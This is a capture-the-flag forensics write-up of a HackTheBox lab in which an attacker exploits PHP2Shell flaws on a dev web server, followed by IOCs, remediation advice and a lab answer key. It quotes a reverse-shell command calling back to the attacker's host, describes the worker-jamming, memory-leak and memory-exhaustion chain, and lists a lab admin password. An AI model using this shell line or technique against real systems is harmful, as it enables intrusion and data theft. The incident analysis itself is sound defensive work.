---
title: "HTB DOOMSDAY Sherlock -PHP2Shell"
date: 2026-10-30
draft: false
tags: ["CVE", "Vulnerability", "PHP", "RCE", "HTB"]
summary: "HTB shelock lab dOOmsDay on CVE-2026-109618"
---
![HTB dOOmsDay lab completion cert](HTB.png)

<aside>
🧭

**The short version.** On 28 Oct 2026 an attacker at `192.168.72.1` took over the DevNotes dev web server (`192.168.72.50`) by sending specially shaped file-upload requests to `/api/health.php`. The server was running PHP 8.4.26, which is one release before the fix. The attacker got a command shell as `www-data` at **08:43:02 UTC**, looked around, and copied the blog database contents to their screen. They connected twice, and then left. I found no sign that they planted anything or took the server further. This page explains how I know, what the evidence looks like, and what to do about it.

</aside>

All times on this page are **UTC**, exactly as they appear in the logs.

## 1. What this lab was about

The task: suspicious traffic was spotted on an internal dev server for [DevNotes.org](http://DevNotes.org).The lab provide two things:

- Apache logs from the server (`access.log`, `error.log`, and an empty `other_vhosts_access.log`)
- A packet capture (`Capture.pcap`, about 268 MB, 310,000 packets) taken on the subnet

My job was to work out what happened, in order, and prove it from the evidence.

## 2. The vulnerability in plain English

"PHP2Shell" is the nickname for two bugs in PHP itself, tracked as **CVE-2026-109618** and **CVE-2026-109619**. Both are rated 9.2 (critical) and both can lead to remote code execution without logging in.

Here is the idea without the jargon.

PHP handles each web request in a worker process, and workers get reused. PHP also allocates memory as it goes. If a request is so big that PHP runs out of memory halfway through setting something up, it stops in a hurry, and some of its bookkeeping is left half-finished. The two bugs are about what happens next:

- **CVE-2026-109618:** when memory runs out in the middle of building the request data, PHP's cleanup code later trusts that half-built data as if it were fine. Leftover bytes can be read as a real PHP value, which can be steered into running a function like `system()`.
- **CVE-2026-109619:** some internal state outlives the request that created it. A later request on the same worker can then use memory that has already been freed (a use-after-free). Datadog confirmed this for the upload-progress code, which is on by default.

To make this work reliably, an attacker needs three things: a way to see where things sit in memory (an address leak), a way to make PHP crash out of memory on purpose, and a way to make sure all their requests land on the **same worker process**. The attacker did all three, and the logs show each step.

The fixed versions are **8.5.12, 8.4.27, 8.3.36 and 8.2.35**. Older branches (7.4, 8.0, 8.1) only have source patches or vendor backports.

## 3. The environment

| Item | Value |
| --- | --- |
| Victim | `192.168.72.50`, a Docker container on a macvlan network |
| Container hostname | `29ea26c62b7f` |
| Web stack | Apache/2.4.69 (Debian), prefork MPM, `mod_php`, **PHP/8.4.26** |
| Worker pool | 150 (`MaxRequestWorkers`), per the site's own "Deploy log" blog post |
| App path | `/var/www/html` (runs as `www-data`) |
| Database | `/var/www/data/devnotes.sqlite` (SQLite: blog posts and comments only) |
| Attacker | `192.168.72.1` (empty user agent) |
| Other clients | `192.168.72.145` and `192.168.72.164`: ordinary-looking background browsing |
| Host kernel (seen from inside the container) | `6.12.38+kali-amd64` |

The attacker's address ending in `.1` and the Kali kernel suggest the attacking machine was the lab host itself, which is typical for these setups. I can't prove that from the logs, so treat it as a guess.

## 4. How the attack unfolded

I'll go stage by stage, then give a single timeline in section 5.

### Stage 0: a quick probe (08:42:59)

The first `POST /api/health.php` requests were testing the water. One of them is almost a textbook proof of concept: it sends a multipart form with just two fields, `PHPSESSID` set to `attacksessionid0001` and `PHP_SESSION_UPLOAD_PROGRESS` set to `pwn`, using the boundary `BNDRY12345`. The server answered normally with `{"status":"ok"}`.

Why those two field names matter: `PHP_SESSION_UPLOAD_PROGRESS` is a feature that makes PHP track upload progress inside the session, and it runs very early, before any of the site's own code. Every single attacker request to `health.php` contains it. Nothing on this site has a reason to use it.

### Stage 1: jam the server so only one worker is free (08:42:52 to 08:43:01)

This is where the attack really started. The attacker opened **149 connections** to `POST /index.php`, each one a chunked `multipart/form-data` upload with the boundary `ZZZZZZZZZZ`. Each one started an upload and then never finished it, so the worker handling it just sat waiting for more data.

With a pool of 150 workers and 149 of them busy waiting, exactly **one** worker was left to serve everyone else, including the attacker's next requests. That is the whole point: if every exploit request lands on one worker, then memory leaked by one request is still there when the next one arrives.

Apache noticed. At 08:43:02 it logged:

```
[Wed Oct 28 08:43:02.243607 2026] [mpm_prefork:error] [pid 1:tid 1] AH00161: server reached MaxRequestWorkers setting, consider raising the MaxRequestWorkers setting
```

The stalled requests stayed open for almost **five minutes**. Every one of them was finally released at 08:47:43, which is also when the 149 matching lines show up in `access.log`. That explains something odd in the access log: those requests show a size of 0 and an early timestamp. The timestamp is when each request started, not when it finished. Also worth mentioning that during this attack window real visitors queued behind the attacker, so this was also a small denial of service.

Proof that the same worker was reused: in `error.log`, the leak request, the memory-exhaustion request and the shell-launching request all ran in **pid 145**. In the second round everything ran in **pid 170**.

### Stage 2: the memory leak (08:43:01)

Next the attacker needed an address. They sent a multipart request with 48 fields (boundary `BBBBBBBBBB`, `Content-Length: 18767`) that included both `PHPSESSID` and `PHP_SESSION_UPLOAD_PROGRESS`. The server replied with a very strange header:

```
Set-Cookie: PHPSESSID=WWWWWWWW%FF%FF%FF%FF%FF%FF%FF%FF%60V%05%26%AE%7F%00%00%06%01%00%00WWWWWWWW...(about 773 KB in total)
```

A normal PHP session ID is 32 plain hex characters. This one was hundreds of thousands of characters of filler (`W`) with raw memory bytes mixed in, written as `%XX`. Look at the repeating chunk `%60V%05%26%AE%7F%00%00`. Read backwards, that is a pointer that begins `0x00007f...`, which is the typical shape of a userland memory address on 64-bit Linux. Those are the leaked heap addresses the attacker needed.

How big was the leaked cookie? `error.log` records it right before the data: `dumpio_out (data-HEAP): 773518 bytes`. That is the full escaped cookie, name included. The access log shows the whole response as 774455 bytes and `error.log` records it as **773518 bytes**. 

### Stage 3: running out of memory on purpose (08:43:01 to 08:43:02)

The attacker sent a set of huge uploads to push PHP over its memory limit while it was still parsing the request. The clearest evidence is in the responses:

```
Fatal error: Allowed memory size of 134217728 bytes exhausted (tried to allocate 20480 bytes) in Unknown on line 0
```

That message is a signature. `134217728` bytes is the stock 128 MB `memory_limit`, and "Unknown on line 0" means PHP failed during request start-up, before any script ran. Anyone who sees that line repeated on an endpoint that should be tiny, like a health check, should be worried.

The attacker used a repeating pair of requests, both on the same worker:

1. A 281,129-byte upload (boundary `CCCCCCCCCC`, about 997 fields) that makes PHP run out of memory.
2. A small follow-up with a **declared** `Content-Length: 451384` but only 2 to 3 KB actually sent. It contained crafted binary data with address-like bytes. This one stalled by design.

That second request is the one that got code to run.

### Stage 4: the shell (08:43:02.40)

Twenty milliseconds after that stalled upload hit the worker, the server itself opened a TCP connection **outward** to the attacker on port **4444**. The packet capture contains the command string that did it:

```
bash -c 'bash -i >& /dev/tcp/192.168.72.1/4444 0>&1'
```

This is a classic reverse shell. Instead of the attacker connecting in, the server connects out and hands over a command prompt. The attacker's own `ps aux` output later even shows it: `sh -c -- bash -c ...` followed by `bash -i`, all running as `www-data`.

So the moment of remote code execution was **08:43:02**.

### Stage 5: what the attacker actually did

I rebuilt both shell sessions from the pcap. Nothing was hidden: it all went over plain TCP.

**Shell 1** (server to `192.168.72.1:4444`, client port 55914, opened 08:43:02.401, closed with a reset 08:46:15.792)

```
08:43:02  www-data@29ea26c62b7f:/var/www/html$        <- shell prompt appears
08:43:36  cat /proc/version
08:44:30  uname -a
08:44:42  ps aux
08:46:00  find / -type f \( -name "*.sqlite" -o -name "*.sqlite3" -o -name "*.db" -o -name "*.db3" -o -name "*.s3db" -o -name "*.sl3" \) 2>/dev/null
          -> /var/www/data/devnotes.sqlite
08:46:13  strings                                      <- typed without a filename
```

That last command is probably what ended the session. Run with no filename, `strings` waits for input and the prompt just hangs. My reading is that the attacker gave up on it and killed their listener, which sent the reset. This is an inference, not something the capture states.

**Shell 2** (client port 46274, opened 08:46:18.651, closed cleanly 08:47:42.382)

```
08:46:48  strings /var/www/data/devnotes.sqlite
08:47:42  exit
```

The `strings` output printed the table layouts and every text row of the database across the connection. I read it in full: the blog's `posts` and `comments` tables, some posts about PHP sessions and Docker, and a lot of comments saying "Nice writeup." There is **no users table and no password hash** in it. Whatever the attacker was looking for, it wasn't in that file.

### Stage 6: the crashes and why they happened

Two Apache workers died with a segmentation fault:

```
[Wed Oct 28 08:46:16.516499 2026] [core:notice] [pid 1:tid 1] AH00052: child pid 145 exit signal Segmentation fault (11)
[Wed Oct 28 08:47:42.631917 2026] [core:notice] [pid 1:tid 1] AH00052: child pid 170 exit signal Segmentation fault (11)
```

My first guess, early on, was that these were failed attempts. The packet capture showed I was wrong. Each crash lines up almost exactly with the end of a shell:

| Shell ended | Worker crash | Gap |
| --- | --- | --- |
| 08:46:15.79 (reset) | pid 145 at 08:46:16.52 | about 0.7 s |
| 08:47:42.38 (exit) | pid 170 at 08:47:42.63 | about 0.25 s |

The shell was a child of the Apache worker. When the shell ended, the worker, still in a corrupted state, fell over. Apache then started a fresh replacement worker each time (pid 170, then pid 175). Because 149 of the other 150 slots were still jammed, that replacement was once again the only free worker, so the attacker simply reused it for round two. That is why shell 2 appears from pid 170.

The third try, on pid 175 at 08:47:43, only got the memory-exhaustion request and **no** shell followed. The attacker released all the stalled connections at the same moment and stopped. Apache was shut down gracefully at 08:55:44.

## 5. Master timeline

| Time (UTC) | What happened | Where I saw it |
| --- | --- | --- |
| 08:24:49 | Apache starts. `Apache/2.4.69 (Debian) PHP/8.4.26` | error.log |
| 08:25:00 | First request in the logs. Every page already returns a parse error from `layout.php` line 37 (unrelated to the attack) | error.log |
| 08:39:49 | `192.168.72.164` logs in as `admin` (after several wrong passwords). See side findings | access.log |
| **08:42:52.530** | **First attacker request.** The first of 149 stalled `POST /index.php` uploads (boundary `ZZZZZZZZZZ`) | error.log, access.log |
| 08:42:58 | First `POST /api/health.php` (a 1,005-field form) | access.log |
| 08:42:59 | Proof-of-concept probe (`BNDRY12345`, `attacksessionid0001`, `pwn`) | error.log |
| 08:43:01 | 66 MB upload runs out of memory. Then the leaking request: a 773,518-byte `PHPSESSID` cookie | error.log |
| 08:43:02.12 | 281,129-byte upload runs out of memory (`134217728` bytes) | error.log |
| 08:43:02.24 | `AH00161` pool is full | error.log |
| 08:43:02.38 | Stalled upload (declared 451,384 bytes) reaches pid 145 | error.log |
| **08:43:02.40** | **Reverse shell 1 connects to `192.168.72.1:4444`** | pcap |
| 08:43:36 to 08:46:13 | `cat /proc/version`, `uname -a`, `ps aux`, `find`, `strings` | pcap |
| 08:46:15.79 | Shell 1 reset by the attacker | pcap |
| 08:46:16.52 | Worker pid 145 segfaults | error.log |
| 08:46:17 to 08:46:18 | Second round of memory-exhaustion plus stalled-upload pairs on pid 170 | error.log |
| 08:46:18.65 | **Reverse shell 2 connects** | pcap |
| 08:46:48 | `strings /var/www/data/devnotes.sqlite` (database contents shown on screen) | pcap |
| 08:47:42.38 | `exit`, shell 2 closes | pcap |
| 08:47:42.63 | Worker pid 170 segfaults | error.log |
| 08:47:43 | One more memory-exhaustion request on pid 175, and all 149 stalled uploads released | error.log |
| 08:55:44 | Apache shut down gracefully (`SIGWINCH`) | error.log |

## 6. Did the attack succeed, and how bad is it?

**Yes, it succeeded.** The attacker ran commands as `www-data` inside the container on two separate occasions.

What I can say with evidence:

- They ran reconnaissance commands only: kernel version, process list, a search for databases.
- They viewed the contents of `/var/www/data/devnotes.sqlite` over the shell. Treat that data as read by the attacker.
- No credentials were in that database. I did not see any file written, any download, any new user, or any other outbound connection from the server. The only connections the server started were the two to port 4444.
- Normal visitors were affected for about five minutes while the worker pool was jammed.

What I cannot say:

- I only have web logs and one packet capture. If anything ran on the machine that didn't touch the network, I wouldn't see it. A container filesystem or process snapshot would be the next thing to ask for.
- The shell ran as `www-data`, which can read the whole web root and anything that user can reach. That includes the app's configuration. Rotate any secret that lived on that box.

## 7. What I got wrong along the way

Since someone will read this later, here are the wrong turns, because they are instructive.

- I first read the two crashes as failed attempts and said the logs showed no sign of success. The packet capture proved the opposite. The crashes were a side effect of the shells closing, not of the exploit failing.
- I first said the 149 `/index.php` requests were "a burst". They are better described as stalled uploads held open for nearly five minutes. I only saw that when I checked when each connection last had activity.
- A first guess at the leaked cookie's size was 774455 and later 600000. The log value that actually records the cookie itself is **773518**.
- An early parse-error line from `layout.php` looked like it might be attacker damage. It is in the very first request at 08:25:00, so it was already broken before anything happened.

## 8. Indicators of compromise (IOCs)

### Network

| Type | Value | Notes |
| --- | --- | --- |
| Attacker IP | `192.168.72.1` | All exploit traffic. Empty user agent (`-`) |
| Victim IP | `192.168.72.50` | Web server, port 80 |
| C2 / shell listener | `192.168.72.1:4444/tcp` | Server connects out to this. Two sessions |
| Shell session 1 | client port `55914`, 08:43:02.401 to 08:46:15.792 | pcap |
| Shell session 2 | client port `46274`, 08:46:18.651 to 08:47:42.382 | pcap |
| Egress that should never happen | web server initiating any TCP connection outward | Web servers normally only answer |

### Web requests

| Indicator | Value |
| --- | --- |
| Endpoint abused | `POST /api/health.php` (a health check that should only answer GET) |
| Noise endpoint | `POST /index.php` (149 stalled uploads) |
| Content type | `multipart/form-data` with `Transfer-Encoding: chunked` (on the flood and the first stage) |
| User agent | `-` (empty) |
| Field names | `PHPSESSID`, `PHP_SESSION_UPLOAD_PROGRESS` in a form that has no business using them |
| Other field names | `f0000` onward, `g0000xxxx...`, `s000000000`, `x`, `big`, `post39[0]`, and a file part named `f` with filename `a.txt` |
| Probe values | `attacksessionid0001`, `pwn` |
| Boundaries | `ZZZZZZZZZZ` (jam), `BNDRY12345` (probe), `SSSSSSSSSSSSSSSSS` (many-field form), `BBBBBBBBBB` (leak), `CCCCCCCCCC` (memory exhaustion and stalled upload) |
| Request sizes | 138 MB and 66 MB (huge forms), 281,129 B (exhaustion), declared 451,384 B (stalled) |
| Oddly large response | `POST /api/health.php 200 774455` in the access log |

### Server logs

```
AH00161: server reached MaxRequestWorkers setting
AH00052: child pid <N> exit signal Segmentation fault (11)
Fatal error:  Allowed memory size of 134217728 bytes exhausted (tried to allocate 20480 bytes) in Unknown on line 0
Warning:  PHP Request Startup: Input variables exceeded 1000.
Set-Cookie: PHPSESSID=<anything not 32 plain hex characters, especially with %FF or %00>
```

### On the host

| Indicator | Value |
| --- | --- |
| Account | `www-data` |
| Shell prompt in the capture | `www-data@29ea26c62b7f:/var/www/html$` |
| Spawn chain | `apache2` child then `sh -c -- bash -c 'bash -i >& /dev/tcp/192.168.72.1/4444 0>&1'` then `bash -i` |
| Shell command | `bash -c 'bash -i >& /dev/tcp/192.168.72.1/4444 0>&1'` |
| Commands run | `cat /proc/version`, `uname -a`, `ps aux`, the `find` command in section 4, `strings`, `strings /var/www/data/devnotes.sqlite`, `exit` |
| File accessed | `/var/www/data/devnotes.sqlite` |

## 9. MITRE ATT&CK mapping

| Step | Tactic | Technique |
| --- | --- | --- |
| Exploited a PHP flaw through the upload endpoint | Initial Access | T1190 Exploit Public-Facing Application |
| Stalled 149 uploads to fill the worker pool | Impact | T1499.002 Service Exhaustion Flood |
| Ran `bash -i` back to the attacker | Execution | T1059.004 Unix Shell |
| Used port 4444 for the shell | Command and Control | T1571 Non-Standard Port |
| `cat /proc/version`, `uname -a` | Discovery | T1082 System Information Discovery |
| `ps aux` | Discovery | T1057 Process Discovery |
| `find` for database files | Discovery | T1083 File and Directory Discovery |
| `strings` on the SQLite file | Collection | T1005 Data from Local System |
| Output returned over the same shell | Exfiltration | T1041 Exfiltration Over C2 Channel |

## 10. What to do about it

**Right now**

1. Update PHP to **8.4.27** or a vendor package that lists the two CVEs in its changelog. Restart every worker and rebuild any container image. A patched package on disk does nothing for workers that are still running the old code.
2. Treat the container as compromised. Rebuild it from a clean image rather than cleaning it. Rotate any password, API key or token that lived in the web root or its environment.
3. Block outbound connections from the web server. This single rule would have stopped the shell here even though the exploit worked.

**Until you can patch**

- Set `session.upload_progress.enabled=0`. This is the common ingredient in every request I saw. Put it in configuration that loads before requests are parsed, then restart.
- On PHP 8.5, also set `fatal_error_backtraces=0`.
- Datadog's interim advice for the memory bug is `memory_limit=-1` set by the administrator, plus size limits at the front end and a container memory cap. Avoid `RLIMIT_AS` and `RLIMIT_DATA`. This has its own risk (one request can eat all memory), so monitor it.
- If you can live without file uploads for a while, block `multipart/form-data` at the web server or proxy.
- Restrict `/api/health.php` to `GET` from your monitoring host only.

**Longer term**

- Turn off `mod_dumpio` in anything that isn't a throwaway lab. It stores every request body, including passwords. In this lab's own log I could read login attempts in plain text.
- Run the container with a read-only filesystem and `no-new-privileges`, and limit what `www-data` can reach.
- Alert on the log lines in the IOC section, and on any web process starting a shell.
- Move off unsupported PHP branches. Moving from `mod_php` to PHP-FPM would not have prevented this, because FPM is affected too.

## 11. Side findings (not part of PHP2Shell)

- **Weak admin login.** At 08:39:49 `192.168.72.164` logged in as `admin` with the password `devnotes123` after several `wrongpass` attempts. The same pattern came from `192.168.72.145`. Those two hosts otherwise look like simulated background traffic, so this is probably lab scaffolding, but on a real server it would be a finding.
- **Broken template.** `/var/www/html/templates/layout.php` has a parse error on line 37. It affects every page and was there at 08:25:00, before any attack.
- **SSH between hosts.** The capture shows about 220 packets of SSH from `192.168.72.1` to each of `.145` and `.164`. It is encrypted and I did not look into it. It fits a lab host driving its traffic simulators.

## 12. Answer key for the lab questions

| # | Question (short) | Answer |
| --- | --- | --- |
| 1 | PHP version | **PHP 8.4.26** |
| 2 | First anomalous request | **28 Oct 2026 08:42:52** (error log: 08:42:52.530235) |
| 3 | Boundary of the stalled uploads | **ZZZZZZZZZZ** |
| 4 | Workers deliberately occupied | **149** |
| 5 | CVEs chained | **CVE-2026-109618 and CVE-2026-109619** |
| 6 | Memory limit exhausted | **134217728** bytes |
| 7 | Cookie that carries the leak | **PHPSESSID** |
| 8 | Size of the leaked cookie | **773518** bytes (from `error.log`) |
| 9 | When RCE was achieved | **08:43:02** |
| 10 | Shell port | **4444** |
| 11 | Second Apache worker crash | **08:47:42** (pid 170) |
| 12 | Command used to find database files | `find / -type f \( -name "*.sqlite" -o -name "*.sqlite3" -o -name "*.db" -o -name "*.db3" -o -name "*.s3db" -o -name "*.sl3" \) 2>/dev/null` |

## Sources

- [PHP2Shell: critical PHP vulnerabilities patched, update now (Help Net Security)](https://www.helpnetsecurity.com/2026/10/21/php2shell-php-vulnerabilities-patched-cve-2026-109618-cve-2026-109619/)
- [PHP2Shell: Critical vulnerabilities in PHP, detection, analysis and remediation (Datadog Security Labs)](https://securitylabs.datadoghq.com/articles/php2shell-critical-vulnerabilities-in-php/)
- [PHP2Shell: PHP RCE (CVE-2026-109618, CVE-2026-109619) (Sansec)](https://sansec.io/research/php2shell)
- Lab evidence: `access.log`, `error.log`, `other_vhosts_access.log` and `Capture.pcap`
